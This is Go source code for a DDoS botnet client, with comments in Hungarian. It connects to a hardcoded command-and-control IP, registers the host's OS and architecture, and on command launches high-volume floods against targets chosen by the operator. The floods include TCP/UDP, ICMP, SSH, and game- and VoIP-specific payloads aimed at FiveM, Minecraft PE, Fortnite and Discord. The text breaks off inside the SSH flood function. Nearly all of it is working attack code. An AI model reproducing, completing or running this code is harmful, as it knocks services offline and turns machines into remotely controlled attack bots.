package main

import (
	"bufio"
	"context"
	crand "crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"log"
	mrand "math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================
// KONFIGURÁCIÓ
// ============================================================
var ServerIP = "13.140.176.180"
var ServerPort = "9174"

func init() {
	if ip := os.Getenv("SERVER_IP"); ip != "" {
		ServerIP = ip
	}
	if port := os.Getenv("SERVER_PORT"); port != "" {
		ServerPort = port
	}
	runtime.GOMAXPROCS(runtime.NumCPU())

	ensureRoot()
}

// ============================================================
// AKTÍV TÁMADÁSOK
// ============================================================
type activeAttack struct {
	cancel context.CancelFunc
	conns  sync.Map
}

var (
	activeMu      sync.Mutex
	activeAttacks = make(map[string]*activeAttack)
)

var connCounter uint64

func connKey(c net.Conn) string {
	if c == nil {
		return ""
	}
	if ra := c.RemoteAddr(); ra != nil {
		n := atomic.AddUint64(&connCounter, 1)
		return fmt.Sprintf("%s#%d", ra.String(), n)
	}
	n := atomic.AddUint64(&connCounter, 1)
	return fmt.Sprintf("conn#%d", n)
}

func trackConn(att *activeAttack, c net.Conn) string {
	k := connKey(c)
	att.conns.Store(k, c)
	return k
}

func untrackConn(att *activeAttack, k string, c net.Conn) {
	if k != "" {
		att.conns.Delete(k)
	}
	if c != nil {
		c.Close()
	}
}

func main() {
	for {
		conn, err := net.DialTimeout("tcp", ServerIP+":"+ServerPort, 10*time.Second)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(15 * time.Second)
			tcpConn.SetNoDelay(true)
			tcpConn.SetWriteBuffer(256 * 1024)
			tcpConn.SetReadBuffer(256 * 1024)
		}

		regMsg := fmt.Sprintf("REGISTER %s %s\n", runtime.GOOS, runtime.GOARCH)
		if _, err := conn.Write([]byte(regMsg)); err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		pingStop := make(chan struct{})
		go func(c net.Conn, stop chan struct{}) {
			defer func() { recover() }()
			ticker := time.NewTicker(20 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-stop:
					return
				case <-ticker.C:
					if _, err := c.Write([]byte("PING\n")); err != nil {
						return
					}
				}
			}
		}(conn, pingStop)

		scanner := bufio.NewScanner(conn)
		scanner.Buffer(make([]byte, 4096), 1024*1024)

		for scanner.Scan() {
			cmd := scanner.Text()
			if cmd == "" {
				continue
			}

			parts := strings.Fields(cmd)
			if len(parts) == 0 {
				continue
			}

			switch parts[0] {
			case "raw", "hold", "ovhudp", "mix",
				"hex", "mcpe", "fivem", "discord", "fortnite",
				"udp", "icmp", "ssh", "game", "dns":
				if len(parts) >= 4 {
					target := parts[1]
					port := parts[2]
					duration, _ := strconv.Atoi(parts[3])
					method := parts[0]
					go startAttack(target, method, func(ctx context.Context, att *activeAttack) {
						switch method {
						case "raw":
							rawFlood(ctx, att, target, port)
						case "hold":
							holdFlood(ctx, att, target, port)
						case "ovhudp":
							ovhUdpFlood(ctx, att, target, port)
						case "mix":
							mixFlood(ctx, att, target, port)
						case "hex":
							hexFlood(ctx, att, target, port)
						case "mcpe":
							mcpeFlood(ctx, att, target, port)
						case "fivem":
							fivemFlood(ctx, att, target, port)
						case "discord":
							discordFlood(ctx, att, target, port)
						case "fortnite":
							fortniteFlood(ctx, att, target, port)
						case "udp":
							udpFlood(ctx, att, target, port)
						case "icmp":
							icmpFlood(ctx, att, target, port)
						case "ssh":
							sshFlood(ctx, att, target, port)
						case "game":
							gameFlood(ctx, att, target, port)
						case "dns":
							dnsFlood(ctx, att, target, port)
						}
					}, duration)
				}
			case "tls", "tlsplus":
				if len(parts) >= 3 {
					u := parts[1]
					duration, _ := strconv.Atoi(parts[2])
					method := parts[0]
					go startAttack(u, method, func(ctx context.Context, att *activeAttack) {
						switch method {
						case "tls":
							tlsFlood(ctx, att, u)
						case "tlsplus":
							tlsPlusFlood(ctx, att, u)
						}
					}, duration)
				}
			case "xreset":
				if len(parts) >= 4 {
					u := parts[1]
					port := parts[2]
					duration, _ := strconv.Atoi(parts[3])
					go startAttack(u, "xreset", func(ctx context.Context, att *activeAttack) {
						xresetFlood(ctx, att, u, port)
					}, duration)
				}
			case "PING":
				conn.Write([]byte("PONG\n"))
			case "stop":
				if len(parts) >= 2 {
					stopAttacksByTarget(parts[1])
				}
			}
		}

		close(pingStop)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

// ============================================================
// START / STOP
// ============================================================
func startAttack(target, method string, attackFunc func(ctx context.Context, att *activeAttack), duration int) {
	ctx, cancel := context.WithCancel(context.Background())
	key := target + "|" + method

	att := &activeAttack{cancel: cancel}

	activeMu.Lock()
	if old, exists := activeAttacks[key]; exists {
		old.cancel()
		old.conns.Range(func(k, v interface{}) bool {
			if c, ok := v.(net.Conn); ok {
				c.Close()
			}
			return true
		})
	}
	activeAttacks[key] = att
	activeMu.Unlock()

	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			cancel()
			att.conns.Range(func(k, v interface{}) bool {
				if c, ok := v.(net.Conn); ok {
					c.Close()
				}
				return true
			})
		})
	}

	go func() {
		defer func() {
			recover()
			activeMu.Lock()
			delete(activeAttacks, key)
			activeMu.Unlock()
			cancel()
			att.conns.Range(func(k, v interface{}) bool {
				if c, ok := v.(net.Conn); ok {
					c.Close()
				}
				return true
			})
		}()
		attackFunc(ctx, att)
	}()
}

func normalizeTarget(t string) string {
	t = strings.TrimSpace(t)
	if t == "" {
		return t
	}
	if strings.Contains(t, "://") {
		if u, err := url.Parse(t); err == nil {
			t = u.Host
		}
	}
	if idx := strings.LastIndex(t, ":"); idx != -1 {
		if _, err := strconv.Atoi(t[idx+1:]); err == nil {
			t = t[:idx]
		}
	}
	if idx := strings.Index(t, "/"); idx != -1 {
		t = t[:idx]
	}
	return t
}

func stopAttacksByTarget(target string) {
	normTarget := normalizeTarget(target)
	if normTarget == "" {
		return
	}

	activeMu.Lock()
	var toCancel []*activeAttack
	for key, att := range activeAttacks {
		parts := strings.SplitN(key, "|", 2)
		if len(parts) < 1 {
			continue
		}
		if normalizeTarget(parts[0]) == normTarget {
			toCancel = append(toCancel, att)
			delete(activeAttacks, key)
		}
	}
	activeMu.Unlock()

	for _, att := range toCancel {
		att.cancel()
		att.conns.Range(func(k, v interface{}) bool {
			if c, ok := v.(net.Conn); ok {
				c.Close()
			}
			return true
		})
	}
}

// ============================================================
// SEGÉD: RANDOM
// ============================================================
var rngMu sync.Mutex
var rng = mrand.New(mrand.NewSource(time.Now().UnixNano()))

func fastRand() uint32 {
	rngMu.Lock()
	v := uint32(rng.Int31())
	rngMu.Unlock()
	return v
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	rngMu.Lock()
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	rngMu.Unlock()
	return string(b)
}

func safeRandIntn(n int) int {
	rngMu.Lock()
	v := rng.Intn(n)
	rngMu.Unlock()
	return v
}

// ============================================================
// L4 - RAW
// ============================================================
func rawFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	payload := make([]byte, 1400)
	crand.Read(payload)
	workers := runtime.NumCPU() * 256
	if workers < 2000 {
		workers = 2000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			dialer := &net.Dialer{Timeout: 3 * time.Second}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				var conn net.Conn
				var err error
				if id%2 == 0 {
					conn, err = dialer.DialContext(ctx, "tcp", addr)
				} else {
					conn, err = dialer.DialContext(ctx, "udp", addr)
				}
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(20 * time.Millisecond):
					}
					continue
				}
				k := trackConn(att, conn)
				for i := 0; i < 5000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							untrackConn(att, k, conn)
							return
						default:
						}
					}
					conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
				untrackConn(att, k, conn)
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L4 - HOLD
// ============================================================
func holdFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)

	workers := runtime.NumCPU() * 512
	if workers < 4000 {
		workers = 4000
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			ticker := time.NewTicker(700 * time.Microsecond)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
				}

				dialer := &net.Dialer{Timeout: 2 * time.Second}
				conn, err := dialer.DialContext(ctx, "tcp", addr)
				if err != nil {
					continue
				}

				if tc, ok := conn.(*net.TCPConn); ok {
					tc.SetNoDelay(true)
					tc.SetKeepAlive(true)
					tc.SetKeepAlivePeriod(1 * time.Second)
					tc.SetWriteBuffer(1024)
				}

				k := trackConn(att, conn)

				go func(c net.Conn, key string) {
					defer untrackConn(att, key, c)

					buf := make([]byte, 1)
					for {
						select {
						case <-ctx.Done():
							return
						default:
						}

						c.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
						if _, err := c.Write(buf); err != nil {
							return
						}

						time.Sleep(1 * time.Second)
					}
				}(conn, k)
			}
		}()
	}

	wg.Wait()
}

// ============================================================
// L4 - OVH UDP
// ============================================================
func ovhUdpFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	workers := runtime.NumCPU() * 256
	if workers < 2000 {
		workers = 2000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				size := 512 + safeRandIntn(1024)
				payload := make([]byte, size)
				crand.Read(payload)
				for i := 0; i < 10000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
			}
		}()
	}
	wg.Wait()
}

// ============================================================
// L4 - MIX
// ============================================================
func mixFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	payload := make([]byte, 1400)
	crand.Read(payload)
	workers := runtime.NumCPU() * 256
	if workers < 2000 {
		workers = 2000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			dialer := &net.Dialer{Timeout: 3 * time.Second}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				var conn net.Conn
				var err error
				if id%3 == 0 {
					conn, err = dialer.DialContext(ctx, "tcp", addr)
				} else {
					conn, err = dialer.DialContext(ctx, "udp", addr)
				}
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(20 * time.Millisecond):
					}
					continue
				}
				k := trackConn(att, conn)
				for i := 0; i < 5000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							untrackConn(att, k, conn)
							return
						default:
						}
					}
					conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
				untrackConn(att, k, conn)
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L4 - HEX
// ============================================================
func hexFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	hexChars := []byte("0123456789ABCDEF")
	workers := runtime.NumCPU() * 256
	if workers < 2000 {
		workers = 2000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				payload := make([]byte, 1024)
				for i := range payload {
					payload[i] = hexChars[safeRandIntn(len(hexChars))]
				}
				for i := 0; i < 10000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
			}
		}()
	}
	wg.Wait()
}

// ============================================================
// L4 - MCPE
// ============================================================
func mcpeFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	workers := runtime.NumCPU() * 384
	if workers < 3000 {
		workers = 3000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				payload := make([]byte, 33)
				payload[0] = 0x01
				binary.BigEndian.PutUint64(payload[1:9], uint64(time.Now().UnixNano()/1e6))
				copy(payload[9:25], []byte{0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78})
				crand.Read(payload[25:33])
				for i := 0; i < 10000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
			}
		}()
	}
	wg.Wait()
}

// ============================================================
// L4 - FIVEM
// ============================================================
func fivemFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	payloads := [][]byte{
		[]byte("\xFF\xFF\xFF\xFFgetinfo "),
		[]byte("\xFF\xFF\xFF\xFFgetinfo xxx"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo fivem"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo\n"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo roxwood"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo 1"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo 0"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo a"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaa"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo json"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo xml"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo status"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo players"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo info"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo server"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo \xFF\xFF\xFF\xFF"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo \x00\x00\x00\x00"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
		[]byte("\xFF\xFF\xFF\xFFgetinfo " + string(make([]byte, 64))),
	}
	workers := runtime.NumCPU() * 512
	if workers < 6000 {
		workers = 6000
	}
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}
			payloadIdx := id % len(payloads)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				for i := 0; i < 20000; i++ {
					if i%100 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}
					if i%100 == 0 {
						payloadIdx = (payloadIdx + 1) % len(payloads)
					}
					if _, err := conn.Write(payloads[payloadIdx]); err != nil {
						break
					}
				}
			}
		}(w)
	}
	wg.Wait()
}

// ============================================================
// L4 - DISCORD (UDP based string flood for voip)
// ============================================================
func discordFlood(ctx context.Context, att *activeAttack, target, port string) {
	workers := 500
	if runtime.NumCPU() > 4 {
		workers = 800
	}
	if runtime.NumCPU() > 8 {
		workers = 1200
	}

	addr := net.JoinHostPort(target, port)

	// UDP string payloads — VoIP-szerű szöveges üzenetek
	// SIP metódusok + hosszú stringek, amiket a VoIP szerverek parse-olni próbálnak
	stringPayloads := [][]byte{
		[]byte("INVITE sip:discord@voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=aaaaaaaaaaaaaaaa\r\nTo: <sip:target@voip.server>\r\nCall-ID: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@discord.gg\r\nCSeq: 1 INVITE\r\nContact: <sip:flood@0.0.0.0:5060>\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n"),
		[]byte("REGISTER sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:discord@voip.server>;tag=bbbbbbbbbbbbbbbb\r\nTo: <sip:discord@voip.server>\r\nCall-ID: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@discord.gg\r\nCSeq: 1 REGISTER\r\nContact: <sip:discord@0.0.0.0:5060>\r\nExpires: 3600\r\nContent-Length: 0\r\n\r\n"),
		[]byte("OPTIONS sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=cccccccccccccccc\r\nTo: <sip:target@voip.server>\r\nCall-ID: cccccccccccccccccccccccccccccccc@discord.gg\r\nCSeq: 1 OPTIONS\r\nAccept: application/sdp\r\nContent-Length: 0\r\n\r\n"),
		[]byte("ACK sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=dddddddddddddddd\r\nTo: <sip:target@voip.server>\r\nCall-ID: dddddddddddddddddddddddddddddddd@discord.gg\r\nCSeq: 2 ACK\r\nContent-Length: 0\r\n\r\n"),
		[]byte("BYE sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=eeeeeeeeeeeeeeee\r\nTo: <sip:target@voip.server>\r\nCall-ID: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee@discord.gg\r\nCSeq: 3 BYE\r\nContent-Length: 0\r\n\r\n"),
		[]byte("MESSAGE sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=ffffffffffffffff\r\nTo: <sip:target@voip.server>\r\nCall-ID: ffffffffffffffffffffffffffffffff@discord.gg\r\nCSeq: 1 MESSAGE\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nDISCORD STRING FLOOD VOIP ATTACK"),
		[]byte("PUBLISH sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=gggggggggggggggg\r\nTo: <sip:target@voip.server>\r\nCall-ID: gggggggggggggggggggggggggggggggg@discord.gg\r\nCSeq: 1 PUBLISH\r\nEvent: presence\r\nExpires: 3600\r\nContent-Length: 0\r\n\r\n"),
		[]byte("SUBSCRIBE sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=hhhhhhhhhhhhhhhh\r\nTo: <sip:target@voip.server>\r\nCall-ID: hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh@discord.gg\r\nCSeq: 1 SUBSCRIBE\r\nEvent: presence\r\nExpires: 3600\r\nContent-Length: 0\r\n\r\n"),
		[]byte("NOTIFY sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=iiiiiiiiiiiiiiii\r\nTo: <sip:target@voip.server>\r\nCall-ID: iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii@discord.gg\r\nCSeq: 1 NOTIFY\r\nEvent: presence\r\nContent-Length: 0\r\n\r\n"),
		[]byte("UPDATE sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=jjjjjjjjjjjjjjjj\r\nTo: <sip:target@voip.server>\r\nCall-ID: jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj@discord.gg\r\nCSeq: 1 UPDATE\r\nContent-Length: 0\r\n\r\n"),
		[]byte("PRACK sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=kkkkkkkkkkkkkkkk\r\nTo: <sip:target@voip.server>\r\nCall-ID: kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk@discord.gg\r\nCSeq: 1 PRACK\r\nContent-Length: 0\r\n\r\n"),
		[]byte("INFO sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=llllllllllllllll\r\nTo: <sip:target@voip.server>\r\nCall-ID: llllllllllllllllllllllllllllllll@discord.gg\r\nCSeq: 1 INFO\r\nContent-Type: application/dtmf-relay\r\nContent-Length: 16\r\n\r\nSignal=1\r\nDuration=100"),
		[]byte("REFER sip:voip.server SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:5060\r\nFrom: <sip:flood@discord.gg>;tag=mmmmmmmmmmmmmmmm\r\nTo: <sip:target@voip.server>\r\nCall-ID: mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm@discord.gg\r\nCSeq: 1 REFER\r\nRefer-To: <sip:flood@discord.gg>\r\nContent-Length: 0\r\n\r\n"),
		// Hosszú stringek — a "string flood" lényege
		[]byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
		[]byte("DISCORD_VOIP_STRING_FLOOD_DISCORD_VOIP_STRING_FLOOD_DISCORD_VOIP_STRING_FLOOD_DISCORD_VOIP_STRING_FLOOD_DISCORD_VOIP_STRING_FLOOD"),
		[]byte("1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"),
		[]byte("abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz"),
		[]byte("voip-rtp-stream-0001-voip-rtp-stream-0002-voip-rtp-stream-0003-voip-rtp-stream-0004-voip-rtp-stream-0005"),
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)

			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}

			payloadIdx := id % len(stringPayloads)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				payload := stringPayloads[payloadIdx]

				for j := 0; j < 500; j++ {
					if j%50 == 0 {
						payloadIdx = (payloadIdx + 1) % len(stringPayloads)
						payload = stringPayloads[payloadIdx]
					}

					conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
					if _, err := conn.Write(payload); err != nil {
						break
					}
				}
			}
		}(i)
	}

	wg.Wait()
}

// ============================================================
// L4 - FORTNITE
// ============================================================
func fortniteFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)

	workers := 800
	if runtime.NumCPU() > 4 {
		workers = 1200
	}
	if runtime.NumCPU() > 8 {
		workers = 1500
	}

	payloads := make([][]byte, 0, 20)

	p1 := make([]byte, 9)
	p1[0] = 0x02
	binary.BigEndian.PutUint32(p1[1:5], mrand.Uint32())
	binary.BigEndian.PutUint32(p1[5:9], mrand.Uint32())
	payloads = append(payloads, p1)

	p2 := make([]byte, 5)
	p2[0] = 0x00
	binary.BigEndian.PutUint32(p2[1:5], mrand.Uint32())
	payloads = append(payloads, p2)

	p3 := make([]byte, 5)
	p3[0] = 0x03
	binary.BigEndian.PutUint32(p3[1:5], mrand.Uint32())
	payloads = append(payloads, p3)

	for _, size := range []int{32, 64, 128, 256, 512, 768, 1024, 1280, 1400, 1472, 1500} {
		p := make([]byte, size)
		crand.Read(p)
		payloads = append(payloads, p)
	}

	var wg sync.WaitGroup

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)

			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(4 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}

			payloadIdx := id % len(payloads)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				for i := 0; i < 100; i++ {
					if i%3 == 0 {
						payloadIdx = (payloadIdx + 1) % len(payloads)
					}
					conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
					if _, err := conn.Write(payloads[payloadIdx]); err != nil {
						break
					}
				}
			}
		}(w)
	}

	wg.Wait()
}

// ============================================================
// L4 - UDP
// ============================================================
func udpFlood(ctx context.Context, att *activeAttack, target, port string) {
	payload := make([]byte, 1472)
	crand.Read(payload)
	addr := net.JoinHostPort(target, port)

	workers := 200
	if runtime.NumCPU() > 4 {
		workers = 400
	}

	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(8 * 1024 * 1024)
				udpConn.SetReadBuffer(1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				for j := 0; j < 100; j++ {
					conn.Write(payload)
				}
			}
		}()
	}

	wg.Wait()
}

// ============================================================
// L4 - ICMP
// ============================================================
func icmpFlood(ctx context.Context, att *activeAttack, target, port string) {
	if !isRoot() {
		log.Println("[icmp] Not root — ICMP flood skipped")
		return
	}

	workers := runtime.NumCPU() * 256
	if workers < 3000 {
		workers = 3000
	}

	var wg sync.WaitGroup

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("ip4:icmp", target)
			if err != nil {
				return
			}
			k := trackConn(att, conn)
			defer untrackConn(att, k, conn)

			packetSize := 65500
			if packetSize > 65507 {
				packetSize = 65507
			}
			payloadLen := packetSize - 8

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				packet := make([]byte, packetSize)
				payload := make([]byte, payloadLen)

				packet[0] = 8
				packet[1] = 0
				packet[2] = 0
				packet[3] = 0
				packet[4] = byte(safeRandIntn(256))
				packet[5] = byte(safeRandIntn(256))
				packet[6] = byte(safeRandIntn(256))
				packet[7] = byte(safeRandIntn(256))

				crand.Read(payload)
				copy(packet[8:], payload)

				checksum := icmpChecksum(packet)
				packet[2] = byte(checksum >> 8)
				packet[3] = byte(checksum)

				for j := 0; j < 100000; j++ {
					if j%1000 == 0 {
						select {
						case <-ctx.Done():
							return
						default:
						}
					}
					conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
					if _, err := conn.Write(packet); err != nil {
						break
					}
				}
			}
		}()
	}

	wg.Wait()
}

func icmpChecksum(data []byte) uint16 {
	var sum uint32
	length := len(data)
	index := 0

	for length > 1 {
		sum += uint32(data[index])<<8 + uint32(data[index+1])
		index += 2
		length -= 2
	}

	if length > 0 {
		sum += uint32(data[index])
	}

	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return uint16(^sum)
}

// ============================================================
// L4 - SSH (PuTTY SSH Socket Flood)
// ============================================================
func sshFlood(ctx context.Context, att *activeAttack, target, port string) {
	addr := net.JoinHostPort(target, port)
	workers := runtime.NumCPU() * 256
	if workers < 2000 {
		workers = 2000
	}

	sshBanner := []byte("SSH-2.0-PuTTY_Release_0.78\r\n")
	sshKexInit := make([]byte, 512)
	crand.Read(sshKexInit)

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			dialer := &net.Dialer{Timeout: 3 * time.Second}
			for {
				select {
				case <-ctx.Done():
					return
				default:
